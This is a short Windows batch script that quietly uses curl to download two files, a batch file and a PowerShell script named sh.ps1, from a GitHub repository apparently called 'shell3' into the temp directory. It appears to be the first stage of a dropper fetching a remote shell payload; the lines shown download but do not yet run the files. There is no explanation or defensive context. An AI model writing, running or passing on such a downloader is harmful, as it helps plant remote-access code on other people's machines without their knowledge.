@echo off
curl https://raw.githubusercontent.com/0x2034/shell3/main/pro.bat -o "%temp%\pro.bat"
curl https://raw.githubusercontent.com/0x2034/shell3/main/sh.ps1 -o "%temp%\sh.ps1"
